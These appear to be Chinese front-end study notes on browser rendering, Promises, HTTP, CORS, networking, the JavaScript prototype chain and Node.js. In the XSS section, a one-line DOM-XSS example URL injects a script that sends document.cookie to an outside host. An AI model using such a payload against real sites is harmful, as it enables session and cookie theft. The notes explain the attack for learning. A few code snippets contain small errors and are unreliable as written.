### 笔记

- html的空格、换行会对Gzip包大小有一定的影响。如果把页面的空格去掉，可以减小包的体积。
- ios Safari中，当使用委托给一个元素添加click事件时，如果事件是委托到 document 或 body 上，并且委托的元素是默认不可点击的（如 div, span 等），此时 click 事件会失效。解决方式：
    - ​将 click 事件直接绑定到目标​元素（​​即 .target）上
    - 将目标​元素换成 a 或者 button 等可点击的​元素
    - ​将 click 事件委托到​​​​​非 document 或 body 的​​父级元素上
    - 给​目标元素加一条样式规则 cursor: pointer;
- 重绘：只影响元素外观的属性改变（background等），则重新绘制元素，称为重绘
- 重排/回流：影响页面布局的元素属性（margin、width等）改变、元素增删、移动，浏览器会使受影响的部分失效，并重建这部分渲染树，完成回流后，重新绘制受影响的部分，称作重排/回流，重排过程中会重绘一次。
- 浏览器会维护一个队列，集中重排。但js去获取style信息（offsetTop、width、scrollTop等）会迫使浏览器立即重排以获取最准确的元素信息。
- Promise的then和catch都会返回新的Promise，所以可以链式调用。then和catch里的报错都会传到后续的catch中
- 对于Promise.all，只要数组中的一个Promise reject，Promise.all的catch就会被调用；但如果reject那个Promise已经有自己的catch了，就不会触发，因为这个catch是返回的一个新的Promise。
- Promise的保存不能被window.onerror捕获，而需要另外监听事件unhandledrejection
- 数组和字符串都有Iterator接口
  ```javascript
  for(let a of [1, 2]){
      console.log(a);
  }
  const string = 'abchd';
  for(let a of string){
      console.log(a);
  }
  const interator = string[Symbol.iterator]();
  interator.next(); // a
  interator.next(); // b
  interator.next(); // c
  ```
- async函数会返回Promise对象，必须等到内部所有await命令后面的 Promise 对象执行完，才会发生状态改变，除非遇到return语句或者抛出错误。只要一个await语句后面的 Promise 变为reject，那么整个async函数都会中断执行。为了不中断，有两种方式
  ```javascript
  // 方式一
  async function f() {
    try {
      await Promise.reject('出错了');
    } catch(e) {
    }
    return await Promise.resolve('hello world');
  }
  f()
  .then(v => console.log(v))
  // hello world

  // 方式二
  async function f() {
    await Promise.reject('出错了')
      .catch(e => console.log(e));
    return await Promise.resolve('hello world');
  }

  f()
  .then(v => console.log(v))
  // 出错了
  // hello world
  ```
- 正常情况下，await命令后面是一个 Promise 对象。如果不是，会被转成一个立即resolve的 Promise 对象。
  ```javascript
  async function f() {
    return await 123;
  }
  f().then(v => console.log(v))
  // 123
  ```
- set数据结构可以用于数组的交集、并集、差集
  ```javascript
  let a = new Set([1, 2, 3]);
  let b = new Set([4, 3, 2]);

  // 并集
  let union = new Set([...a, ...b]);
  // Set {1, 2, 3, 4}

  // 交集
  let intersect = new Set([...a].filter(x => b.has(x)));
  // set {2, 3}

  // 差集
  let difference = new Set([...a].filter(x => !b.has(x)));
  // Set {1}
  ```
- 日志分析、大数据处理系统ELK：elasticsearch、logstash、kibana，对应的，新浪当前使用的elasticsearch、rsyslog、grafana
- 大数据存储、查询、处理系统：kafka、spark、hadoop
- 可以设置Strict-Transport-Security头，让浏览器直接重定向http到https，而不需要服务器重定向。早期，浏览器会一直存储Strict-Transport-Security的设置，用户不能清除；从而可以在一个页面中发起多个请求，通过请求中的Strict-Transport-Security值，可以组成一个010101010形式的二进制信息，从而实现永久地认识用户。但是，该bug已被修复，该header头会随着cookie一起清除。
- substr从指定位置开始截取指定长度。slice、substring指定开始和结束，截取。substring中参数为负会转为0，两个参数中，取小值为开始。slice中，若第一个参数等于大于第二个参数,则返回空字符串。
- css对页面的阻塞情况
  - css加载不会阻塞DOM树的解析
  - css加载会阻塞DOM树的渲染
  - css加载会阻塞后面js语句的执行，但不会阻塞js加载
  - js会阻塞dom树解析、渲染，因此未解析的css link可能会被阻塞加载
- get请求和post请求的区别
  - 语义差别
  - GET在浏览器回退时是无害的，而POST会再次提交请求。
  - GET产生的URL地址可以被Bookmark，而POST不可以。
  - GET请求会被浏览器主动cache，而POST不会，除非手动设置。
  - GET请求只能进行url编码，而POST支持多种编码方式。
  - GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
  - GET请求在URL中传送的参数是有长度限制的，而POST么有。
  - 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
  - GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
  - GET参数通过URL传递，POST放在Request body中。  
- http缓存控制
  - expired/cache-control（强缓存）：用两者设置缓存后，浏览器不会向服务请求；expired是服务器时间，客户端和服务端时间不一致，可能有问题；cache-control（max-age、no-cache）只有http 1.1支持。两者都存在，内容更新后，客户端资源得不到及时更新得问题
  - last-modified/etag（弱缓存）：浏览器会向服务器确认资源是否过期，没有过期服务器返回304。但其实服务器无法精确确定last-modified时间，所以为资源分配一个id即etag；计算etag的hash有性能消耗。
  - 缓存优先级：强缓存 > 弱缓存，具体是cache-control > expired > last-modified = etag
  - 对于前端资源，一般都这只很长的强缓存，然后通过更新index.html的资源文件名来更新资源
  - 箭头函数的this、arguments都是父级作用域的this、arguments，bind、call、apply对箭头函数无效，箭头函数没有prototype，不能对箭头函数使用new，yield 关键字通常不能在箭头函数中使用（除非是嵌套在允许使用的函数内）
  - 虽然箭头函数中的箭头不是运算符，但箭头函数具有与常规函数不同的特殊运算符优先级解析规则
    ```javascript
      callback = callback || () => {};      
      // SyntaxError: invalid arrow-function arguments

      callback = callback || (() => {});    // ok
    ```
  - 闭包：可以理解为能够读取其他函数内部变量的函数，由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成"定义在一个函数内部的函数"。所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。
  - 同一个函数内部的闭包作用域只有一个，所有闭包共享。在执行函数的时候，如果遇到闭包，则会创建闭包作用域的内存空间，将该闭包所用到的局部变量添加进去，然后再遇到闭包时，会在之前创建好的作用域空间添加此闭包会用到而前闭包没用到的变量。函数结束时，会清除没有被闭包作用域引用的变量。
    ```javascript
    const heapdump = require('heapdump')
    let leakObject = null
    let count = 0
    /* 这段代码内存泄露原因是：在 testMemoryLeak 函数内有两个闭包：unused 和 leakMethod。unused 这个闭包引用了父作用域中的 originLeakObject 变量，如果没有后面的 leakMethod，则会在函数结束后被清除，闭包作用域也跟着被清除了。因为后面的 leakObject 是全局变量，即 leakMethod 是全局变量，它引用的闭包作用域（包含了 unused 所引用的 originLeakObject）不会释放。而随着 testMemoryLeak 不断的调用，originLeakObject 指向前一次的 leakObject，下次的 leakObject.leakMethod 又会引用之前的 originLeakObject，从而形成一个闭包引用链，而 leakStr 是一个大字符串，得不到释放，从而造成了内存泄漏。

    解决方法：在 testMemoryLeak 函数内部的最后添加 originLeakObject = null 即可。 */
    // 全局变量leakObject引用了局部变量leakMethod函数，导致testMemoryLeak的闭包不能释放，因为闭包作用域只有一个，
    // 所以unused函数对originLeakObject函数的引用也不能释放
    setInterval(function testMemoryLeak() {
      const originLeakObject = leakObject
      const unused = function () {
        if (originLeakObject) {
          console.log('originLeakObject')
        }
      }
      leakObject = {
        count: String(count++),
        leakStr: new Array(1e7).join('*'),
        leakMethod: function () {
          console.log('leakMessage')
        }
      }
    }, 1000)
    ```
- 跨域
  - script、link、img、video、iframe、@font-face等可以跨域
  - 存储在浏览器中的数据，如localStorage和IndexedDB，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的Javascript脚本不能对属于其它源的数据进行读写操作。
  -  Cookies 使用不同的源定义方式。一个页面可以为本域和任何父域设置cookie，只要是父域不是公共后缀（public suffix，比如.com, .co.uk and pvt.k12.ma.us，https://publicsuffix.org）即可。
  - 使用cors解决跨域，且希望发送cookie时，浏览器、服务器都需要设置：
    ```bash
    # 浏览器
    xhr.withCredentials = true;
    # 服务器设置响应header
    Access-Control-Allow-Credentials: true
    # 不能指定域名，而且只能指定单一域名
    Access-Control-Allow-Origin: 'domain name'
    ```
  - jsonp只能用于get请求，cors不支持ie10以下，jsonp只需要一次请求，cors多一次option请求。JSONP不是浏览器规范，服务端处理不当，有安全问题，并且jsonp的错误处理也不完善，只能监听script的onerror事件，但对于跨域的script error，浏览器不会给出详细的报错信息。
  - 解决：jsonp、cors、代理服务器、iframe postMessage
- http状态码：
  - 100：continue
  - 101：协议转换
  - 200：ok
  - 204：no-content
  - 301：永久重定向
  - 302：临时重定向
  - 304：not modified
  - 400：bad request
  - 401：Unauthorized
  - 403：forbidden
  - 404：not found
  - 500：Internal Server Error
  - 501：Not Implemented
  - 502：Bad Gateway
  - 504：Gateway Timeout
- 7层网络协议：
  - 物理层：规定通信设备的机械的、电气的、功能的和过程的特性，用以建立、维护和拆除物理链路连接。具体地讲，机械 特性规定了网络连接时所需接插件的规格尺寸、引脚数量和排列情况等;电气特性规定了在物理连接上传输bit流时线路上信号电平的大小、阻抗匹配、传输速率 距离限制等;功能特性是指对各个信号先分配确切的信号含义，即定义了DTE和DCE之间各个线路的功能;规程特性定义了利用信号线进行bit流传输的一组 操作规程，是指在物理连接的建立、维护、交换信息是，DTE和DCE双放在各电路上的动作系列。在这一层，数据的单位称为`比特(bit)`。属于物理层定义的典型规范代表包括：EIA/TIA RS-232、EIA/TIA RS-449、V.35、RJ-45等。
  - 数据链路层：在物理层提供比特流服务的基础上，建立相邻结点之间的数据链路，通过差错控制提供数据帧(Frame)在信道上无差错的传输，并进行各电路上的动作系列。数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址(mac地址)、数据的成帧、流量控制、数据的检错、重发等。在这一层，数据的单位称为`帧(frame)`。数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。  
  - 网络层：在 计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点， 确保数据及时传送。网络层将数据链路层提供的帧组成数据包，包中封装有网络层包头，其中含有逻辑地址信息- -源站点和目的站点地址的网络地址。如 果你在谈论一个IP地址，那么你是在处理第3层的问题，这是`“数据包”`问题，而不是第2层的“帧”。IP是第3层问题的一部分，此外还有一些路由协议和地 址解析协议(ARP)。有关路由的一切事情都在这第3层处理。地址解析和路由是3层的重要目的。网络层还可以实现拥塞控制、网际互连等功能。在这一层，数据的单位称为数据包(packet)。网络层协议的代表包括：IP、IPX、RIP、OSPF等。
  - 传输层：第4层的数据单元也称作`数据包(packets)`。但是，当你谈论TCP等具体的协议时又有特殊的叫法，TCP的数据单元称为段 (segments)而UDP协议的数据单元称为“数据报(datagrams)”。这个层负责获取全部信息，因此，它必须跟踪数据单元碎片、乱序到达的 数据包和其它在传输过程中可能发生的危险。第4层为上层提供端到端(最终用户到最终用户)的透明的、可靠的数据传输服务。所为透明的传输是指在通信过程中 传输层对上层屏蔽了通信传输系统的具体细节。传输层协议的代表包括：TCP、UDP、SPX等。
  - 会话层：这一层也可以称为会晤层或对话层，在会话层及以上的高层次中，数据传送的单位不再另外命名，而是统称为报文。会话层不参与具体的传输，它提供包括访问验证和会话管理在内的建立和维护应用之间通信的机制。如服务器验证用户登录便是由会话层完成的。
  - 表示层：这一层主要解决拥护信息的语法表示问题。它将欲交换的数据从适合于某一用户的抽象语法，转换为适合于OSI系统内部使用的传送语法。即提供格式化的表示和转换数据服务。数据的压缩和解压缩， 加密和解密等工作都由表示层负责。
  - 应用层为操作系统或网络应用程序提供访问网络服务的接口。应用层协议的代表包括：Telnet、FTP、HTTP、SNMP等。
- tcp/ip：
  - TCP/IP协议中的应用层处理开放式系统互联模型中的第五层、第六层和第七层的功能。
  - 在TCP中,当发送端的数据到达接收主机时,接收端主机会返回一个已收到消息的通知。这个消息叫做确认应答--ACK(Positive Acknowled-gement 意指已经接收。)
  - 三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息（注：简单地说，就是为了确认server、client的可发可收；如果不这样，可能的问题，比如client向server发送的报文在某个网络节点滞留了很久后才到达server，这时server以为是client刚发的，就向client发送确认报文，但client觉得自己当前没有发送请求，会忽略server的报文，但服务端以为连接成功建立了，浪费资源）
  - 四次挥手：client1告诉client2自己数据发完了（FIN），client2收到后回复client1说自己知道了（ACK），但client2还可以继续向client1发数据，发完后，告诉client1发完了（FIN），client1收到后回复client2（ACK）。
  - TCP在传送大量数据时,是以MSS(Maximum Segment Size 最大消息长度)的大小将数据进行分割发送。进行重发是也是以MSS为单位。在三次握手时，会告诉对方自己的MSS大小，然后以最小的MSS发送数据
  - Todo：继续完善https://www.jianshu.com/p/1579ad49c5f8  
- http：
  - http是面向文本的，报文分为请求报文和响应报文，两种报文都包含请求行（第一行）、请求头部、空行、请求数据
  - 请求报文：
    - 请求行：请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。例如，GET /index.html HTTP/1.1
    - 请求头部：由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，就是常说的请求头
    - 空一行
    - 请求数据：get请求为空，post请求为post的内容
  - 响应报文：
    - 请求行：协议版本 响应状态码。如HTTP/1.1 200 ok
    - 响应头
    - 空一行
    - body
    ```
      HTTP/1.1 200 OK
      Date: Sat, 31 Dec 2005 23:59:59 GMT
      Content-Type: text/html;charset=ISO-8859-1
      Content-Length: 122

      ＜html＞
    ```
- https：
  - HTTP协议运行在TCP之上，所有传输的内容都是明文，HTTPS运行在SSL/TLS之上，SSL/TLS运行在TCP之上，所有传输的内容都经过加密的。
- http2：
  - 基于SPDY，主要区别是SPDY强制https，http2不强制，两者的消息头压缩算法不同
  - HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通讯双方各自cache一份header fields表，既避免了重复header的传输，又减小了需要传输的大小。（注：其实http2是一个长连接了，所以是双方是有状态的，所以可以cache header）每次只传输差异性header
  - 支持服务推送：在客户端请求之前，就可以向客户端推送未来会用到的资源
  - 帧：HTTP/2 数据通信的最小单位消息：指 HTTP/2 中逻辑上的 HTTP 消息。例如请求和响应等，消息由一个或多个帧组成。
  - 流：存在于连接中的一个虚拟通道。流可以承载双向消息，每个流都有一个唯一的整数ID。
  - HTTP/2 采用二进制格式传输数据，而非 HTTP 1.x 的文本格式，二进制协议解析起来更高效。 HTTP / 1 的请求和响应报文，都是由起始行，首部和实体正文（可选）组成，各部分之间以文本换行符分隔。HTTP/2 将请求和响应数据分割为更小的帧，并且它们采用二进制编码。
  - HTTP/2 中，同域名下所有通信都在单个连接上完成，该连接可以承载任意数量的双向数据流。每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，根据帧首部的流标识可以重新组装。
- 表单请求是允许跨域的，跨域限制本质上是一个域名的 JS ，在未经允许的情况下，不得读取另一个域名的内容。但浏览器并不阻止你向另一个域名发送请求，表单提交是会刷新页面的，所以开发者无法访问跨域内容
- 文件上传断点续传：文件分片上传，通过分片id续传
- vue-rouer：根据路由确定要渲染的组件，hash模式通过hashchange事件实现，history模式利用html5的history api，由于hash后的内容浏览器会忽略，所以服务器完全不知道
- BFC
  - FC是formatting context的首字母缩写，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用
  - 常见的FC有BFC、IFC（行级格式化上下文），还有GFC（网格布局格式化上下文）和FFC（自适应格式化上下文
  - BFC 可以简单的理解为某个元素的一个 CSS 属性，只不过这个属性不能被开发者显式的修改，拥有这个属性的元素对内部元素和外部元素会表现出一些特性，这就是BFC。
  - 可以触发BFC的属性：float不为none，overflow不为visible，display的值为table、inline-block、table-cell、table-caption，position的值为absolute或fixed，
  - 可用于清除浮动、阻止margin合并
- XSS：跨站脚本（Cross-site scripting），通过客户端脚本语言（最常见如：JavaScript）在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS  
  - 存储型XSS：用户提交恶意表单，数据被存入数据库，其他用户请求的，浏览器执行了恶意表单中的代码
  - 反射型XSS：将用户输入的存在XSS攻击的数据，发送给后台，后台并未对数据进行存储，也未经过任何过滤，直接返回给客户端。被浏览器渲染
  - dom xss：比如访问如下链接http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie</script>
  -  防御：一般是转义就行
-  CSRF：跨站请求伪造（Cross-site request forgery）,冒充用户发起请求（在用户不知情的情况下）
  - 一般方式是诱导用户在正常网站发出攻击者想发出的请求
  - 防御：使用ajax、验证referer、在请求中添加token
- 线性存储结构：比如数组。相邻数据元素的存放地址也相邻（逻辑与物理统一）；要求内存中可用存储单元的地址必须是连续的。优点：存储密度大
（＝1），存储空间利用率高。缺点：插入或删除元素时不方便  
- 链式存储结构：比如链表。相邻数据元素可随意存放，但所占存储空间分两部分，一部分存放结点值，另一部分存放表示结点间关系的指针.优点：插入或删除元素时很方便，使用灵活。缺点：存储密度小（<1），存储空间利用率低
- js原型链相关
  - 只有函数对象才有 prototype属性，除开函数对象之外的对象都是普通对象，该函数的实例也没有prototype。prototype可以理解为，函数作为构造函数使用时，实例（instance）真正集成属性和方法的地方
  - 对象有属性__proto__，指向该对象的构造函数的原型对象，也就是该对象的属性、方法真正继承的来源，即其构造函数的prototype
  - constructor属性始终指向创建这个对象的构造函数，
    ```javascript
    function a () {}
    const b = new a()
    console.log(b.prototype) // undefined
    console.log(b.__proto__ === a.prototype) // true
    console.log(b.constructor === a) // true
    console.log(a.constructor === Function) // true
    console.log(a.__proto__ === Function.prototype) // true
    ```
  - 之所以要在构造函数的原型上定义方法，而不是直接在构造函数内部写`this.method = function`，一个原因是不希望每次实例化都重新声明函数，浪费内存
  - 实现继承主要就是要达到两点目的：1. 继承父类的属性和方法，2. 保证继承关系符合语义，子类、实例等对prototype的修改符合预期，针对第二点：
    - instanceof正确，即实例对子类和父类的instanceof都是true，也就是子类的prototype的__proto__是父类的prototype
    - 实例的constructor是子类
    - 对子类prototype的修改不应该反应到父类的prototype中
  - 对象继承：可以基于原型链、也可以直接拷贝
    ```javascript
    // http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html
    function extend (child, parent) {
      var f = function () {}
      f.prototype = parent.prototype
      // 比如实例c，c的__proto__是child.prototype，而child.prototype是new f()
      // new f()的__proto__是f.prototype，也即是parent.prototype
      // 从而保证instanceof不会失效
      child.prototype = new f()
      child.prototype.constructor = child
    }
    ```
  -  instanceof：obj 会一直沿着隐式原型链 __proto__ 向上查找直到 某一级的__proto__为被判断的对象的prototype为止，如果找到则返回 true，也就是 obj 为 Obj 的一个实例。否则返回 false，obj 不是 Obj 的实例。（注：对象的__proto__指向真正该对象继承的来源，该来源又是类的prototype，所以这样判断）
- transition缺点：需要事件触发，无法自动播放，无法重复播放，只能定义首尾状态，无法定义中间状态，只能定义一个属性变化，animation解决了这些问题
  ```css
  .div {
    animation: myFrame 1s infinite
  }
  @keyframe myFrame{
    0% { left: 20px}
    100% { left: 100px }
  }
  ```
- ES6 模块与 CommonJS 模块的差异
  - CommonJS 模块输出的是一个值的拷贝或者对象引用，ES6 模块输出的就是这个变量，因此es6 import的变量不允许重新赋值，并且变量在内部改变后，引用的地方会同步变化
  - CommonJS 模块是运行时加载，ES6 模块是编译时输出接口，因此不能import表达式
  - JS 引擎对脚本静态分析的时候，遇到模块加载命令import，就会生成一个只读引用。等到脚本真正执行时，再根据这个只读引用，到被加载的那个模块里面去取值。所以模块内部的值变化后，下次再去模块取值就是变化后的值
  - 如果多次重复执行同一句import语句，那么只会执行一次，而不会执行多次。
  - ES6 模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系，以及输入和输出的变量。CommonJS 和 AMD 模块，都只能在运行时确定这些东西。
- nodejs require顺序：
  - 首先查看是否是内核,是就直接返回
  - 路径形式直接按路径加载
  - 文件后缀名顺序：.js、.json、.node
  - 非路径形式，优先加载核心模块，如果不存在，就从当前路径开始一级级向上寻找 node_modules 子目录，直到根目录
  - 如果设置了NODE_PATH环境变量，最后会在NODE_PATH的位置查找
- addEventListener回调中的this是触发事件的dom元素，ie8貌似是window
- 小程序使用双 WebView 双线程的模式隔离了JS逻辑与UI渲染，形成了特殊的开发模式，加强了 H5 与 Native 混合程度，提高了页面性能及开发体验。
- hybrid：
  - js调用native实现方案：
    1. API注入，原理其实就是 Native 获取 JavaScript环境上下文，并直接在上面挂载对象或者方法，使 js 可以直接调用，Android(addJavascriptInterface) 与 IOS 分别拥有对应的挂载方式。(其实js挂一个方法到window上，native也可以调的)
    2. WebView 中的 prompt/console/alert 拦截，通常使用 prompt，因为这个方法在前端中使用频率低，比较不会出现冲突；
    3. WebView URL Scheme 跳转拦截，webview发出请求，客户端拦截请求，然后通过window.dispatchEvent来回传数据（webview已经监听了对应的事件）
  - native通知js：
    ```javascript
    // ios
    // Swift
    webview.stringByEvaluatingJavaScriptFromString("alert('NativeCall')")
    // android
    // 调用js中的JSBridge.trigger方法
    // 该方法的弊端是无法获取函数返回值；
    webView.loadUrl("javascript:JSBridge.trigger('NativeCall')")
    // android 4.4以上
    // 4.4+后使用该方法便可调用并获取函数返回值；
    // 这时我们需要使用前面提到的 prompt 的方法进行兼容，让 H5端 通过 prompt 进行数据的发送，客户端进行拦截并获取数据
    mWebView.evaluateJavascript（"javascript:JSBridge.trigger('NativeCall')", 	 new ValueCallback<String>() {
        @Override
        public void onReceiveValue(String value) {
            //此处为 js 返回的结果
        }
    });
    ```
  - bridge初始化：由客户端注入bridge js，但是h5很难知道注入时机，因此需要监听ready事件
- 模块循环依赖
  - nodejs的require不会出现循环引用的问题，因为第一次require后模块存在内存中，第二次require的时候直接取内存中的值（模块导致出的exports），不会再执行一次模块
  - es6也没有循环引用的问题：ES6根本不会关心是否发生了"循环加载"，只是生成一个指向被加载模块的引用，需要开发者自己保证，真正取值的时候能够取到值
  - 详细及示例：http://www.ruanyifeng.com/blog/2015/11/circular-dependency.html
- C++中指针和引用的区别
  - 引用必须被初始化，但是不分配存储空间。指针不声明时初始化，在初始化的时候需要分配存储空间。
  - 引用初始化后不能被改变，指针可以改变所指的对象。
  - 不存在指向空值的引用，但是存在指向空值的指针
  - 指针从本质上讲就是存放变量地址的一个变量，在逻辑上是独立的，它可以被改变，包括其所指向的地址的改变和其指向的地址中所存放的数据的改变
  - 引用是一个别名，它在逻辑上不是独立的，它的存在具有依附性，所以引用必须在一开始就被初始化，而且其引用的对象在其整个生命周期中是不能被改变的（自始至终只能依附于同一个变量）
  - 可以看到，js的引用类型变量更像一个指针
- js隐士类型转换
  - valueOf方法：数字、字符串、对象、数组、函数的valueOf都是本身，Date的valueOf返回数字类型的毫秒时间戳，undefined、null报错
  - toString方法：数字（字符串数字），NaN（字符串NaN），undefined报错，字符串（本身），boolean（boolean字符串），array(array.join(','))，function(func文本)，Date（当地时间字符串），除这些对象及其实例化对象之外，其他对象返回的都是该对象的类型，也即Object.prototype.toString()的返回值
  - 隐士转换时内部执行`ToPrimitive(input, PreferredType?)`，如果，PreferredType是要转换到的类型，只有转换Date时是string，其他时候都是number
  - + ：统一往number转，即调用valueOf，转换后，如果不是原始值 ，调用toString
  - - * / ：调用valueOf，转换后，如果不是原始值 ，调用toString，转为原始值后再toNumber
  - == ：比较x==y
    1. typeOf两者相同，基本类型按照强等比，NaN不等于NaN，引用类型，按指针比
    2. typeOf两者不同，null=undefined，字符串、Boolean会toNumber，对象调用ToPrimitive
  - https://juejin.im/post/5a7172d9f265da3e3245cbca
- 使用call调用对象的方法时，之所以要`Object.prototype.method`，而不是`Object.method`，是因为后者没有实例化，没有this
- es6私有方法实现：
  ```javascript
  // 私有方法移动到class外
  class Widget {
    foo (baz) {
      bar.call(this, baz);
    }
  }
  function bar(baz) {
    return this.snaf = baz;
  }
  // 使用symbol
  const bar = Symbol('bar');

  class myClass{
    // 公有方法
    foo(baz) {
      this[bar]();
    }
    // 私有方法
    [bar]() {
      return this[snaf] = baz;
    }
  }
  // 新的提案：用#前缀代表私有方法
  ```
- nodejs代码热更新：更新require的cache即可，但是很可能使用的地方还是旧的引用，代码并得不到更新，并且还有内存泄露的风险
- nodejs只有一个执行上下文，require的代码可以认为是包装为了自执行函数，放在同一个上下文里执行。但是node也提供了自己创建上下文的方法`require('vm').runInThisContext`
- Promise.then((onResolve, onRejected) => {})，onRejected捕获不到onResolve继续抛出的异常，如果用catch就可以，并且用了onRejected后，后面的catch不会执行，从而丢失链式调用
- Node.js 中 Eventemitter 的 emit 是同步的
- 实现sleep函数
  ```javascript
  function sleep(ms) {
    var start = Date.now(), expire = start + ms;
    while (Date.now() < expire) ;
    return;
  }
  ```
- 在nodejs程序中可以通过 process.chdir() 来改变当前的工作目录
- console是同步的
- linux ps命令参数
  - A 列出所有的进程
  - aux 显示所有包含其他使用者的进程
  - au 显示较详细的资讯
  - w 显示加宽可以显示较多的资讯
  - ef 显示所有进程信息，连同命令行
- nodejs父子进程之间使用的IPC通讯，Node.js 中的 IPC 通信是由 libuv 通过管道技术实现的, 在 windows 下由命名管道（named pipe）实现也就是上表中的最后第二个, *nix 系统则采用 UDS (Unix Domain Socket) 实现
- nodejs cluster 
  - 采用round-robin调度算法做负载均衡，新连接由主进程接受，然后由它选择一个可用的worker把连接交出去，注意：在windows平台，默认使用的是IOCP
  - 多个进程只占用一个端口的实现：
    - 原始思路：master 进程创建 socket，绑定到某个地址以及端口后，自身不调用 listen 来监听连接以及 accept 连接，而是将该 socket 的 fd 传递到 fork 出来的 worker 进程，worker 接收到 fd 后再调用 listen，accept 新的连接。这样的实现开发者无法控制worker的负载均衡，会导致多个worker竞争，达不到负载均衡
    - 新思路：master 进程创建 socket，绑定地址以及端口后再进行监听。该 socket 的 fd 不传递到各个 worker 进程。当 master 进程获取到新的连接时，再决定将 accept 到的客户端连接分发给指定的 worker 处理，默认的分发算法是round-robin
    - 两种实现的区别主要是分发算法以及master是否listen
  - 父子进程IPC通道建立：父进程创建一个pipe，并保存对管道一端的操作，然后fork一个子进程，并通过环境变量将管道的另一端文件描述符 fd 传递到子进程，子进程启动后通过环境变量拿到 fd，并将 fd 绑定到一个新构造的 pipe 上，最后通道建立
  - http://taobaofed.org/blog/2015/11/10/nodejs-cluster-2/
- Buffer大小是固定不变的, 并且其内存在 V8 堆栈外分配原始内存空间. Buffer 类的实例创建之后, 其所占用的内存大小就不能再进行调整  
- Duplex 流和 Transform 流都是同时可读写的, 他们会在内部维持两个缓冲区, 分别对应读取和写入, 这样就可以允许两边同时独立操作
- bind方法绑定作用域后，再bind到不同的作用域，不会生效。因为console的方法在实现时已经bind过了，所以对console的方法执行bind不会生效
- 解决js浮点数计算的问题：转换为整数计算
  - https://github.com/camsong/blog/issues/9
- 跨域：同源只域名相同、协议相同、端口相同，非同源即跨域。非同源的页面之间不能互相读cookie、localstorage、indexdb，但是两个页面将document.domain设置为相同的域名，cookie可以互相访问
- tcp粘包
  - 原因：tcp会用Nagle 算法缓存数据包，一起发送，以提到IO性能。多个包一起发送时，接受端可能先收到部分包1，再收到剩余包1+包2，或者先收到包1+部分包2，再收到剩余包2
  - 解决方式：禁用tcp的缓存算法、发一个包等一段时间、或进行封包/拆包（肯定是选择最后一种解决方式啊）
  - udp不存在粘包是因为udp的包是一个一个地发的
- tcp三次握手、四次挥手对应的状态：CLOSED、LISTEN、SYN-SENT、SYN-RECEIVED、ESTABLISHED、CLOSE-WAIT、LAST-ACK、FIN-WAIT-1、FIN-WAIT-2、CLOSING、TIME-WAIT
  - TIME_WAIT：连接放主动断开连接，四次挥手时，等待对方的ack，todo
- put与post请求差异
  - 语义：put是更新，post是增加
  - 幂等：put多次请求会得到同样的结果，是幂等的。post多次请求会创建多个资源，非幂等
- 引用跨域的script报错时，error message是Script error，解决方式是，服务端允许跨域，并且在script标签上添加crossorigin="anonymous"
- Node.js 中的 http.Agent 用于池化 HTTP 客户端请求的 socket (pooling sockets used in HTTP client requests). 也就是复用 HTTP 请求时候的 socket. 如果你没有指定 Agent 的话, 默认用的是 http.globalAgent
- https加密流程：
  1. 浏览器将自己支持的一套加密规则发送给网站。 
  2. 网站从中选出一组加密算法与HASH算法，并将自己的身份信息以证书的形式发回给浏览器。证书里面包含了网站地址，加密公钥，以及证书的颁发机构等信息。 
  3. 浏览器获得网站证书之后浏览器要做以下工作： 
    a) 验证证书的合法性（颁发证书的机构是否合法，证书中包含的网站地址是否与正在访问的地址一致等），如果证书受信任，则浏览器栏里面会显示一个小锁头，否则会给出证书不受信的提示。   
    b) 如果证书受信任，或者是用户接受了不受信的证书，浏览器会生成一串随机数的密码，并用证书中提供的公钥加密。   
    c) 使用约定好的HASH算法计算握手消息，并使用生成的随机数对消息进行加密，最后将之前生成的所有信息发送给网站。   
  4. 网站接收浏览器发来的数据之后要做以下的操作： 
    a) 使用自己的私钥将信息解密取出密码，使用密码解密浏览器发来的握手消息，并验证HASH是否与浏览器发来的一致。   
    b) 使用密码加密一段握手消息，发送给浏览器。   
  5. 浏览器解密并计算握手消息的HASH，如果与服务端发来的HASH一致，此时握手过程结束，之后所有的通信数据将由之前浏览器生成的随机密码并利用对称加密算法进行加密
  6. https://blog.csdn.net/clh604/article/details/22179907
  7. https://www.jianshu.com/p/7158568e4867
- 前端工程化：
  - 目的
- es6 class：
  - super是父类的constructor，子类只有调用super完成对this的塑造后才能使用this，另外super也可以用于调用父类的方法。super相当于es5的Parent.call(this)
  - ES5 的继承，实质是先创造子类的实例对象this，然后再将父类的方法添加到this上面（Parent.apply(this)）。ES6 的继承机制完全不同，实质是先将父类实例对象的属性和方法，加到this上面（所以必须先调用super方法），然后再用子类的构造函数修改this。
  - super作为函数调用是，指向父类的构造函数，但其this指向子类，相当于A.prototype.constructor.call(this)；作为函数时，super()只能用在子类的构造函数之中，用在其他地方就会报错
  - super作为对象时，在普通方法中，指向父类的原型对象，但this却指向子类的实例（哭）；在静态方法中，指向父类，但this却指向子类本身（哭）
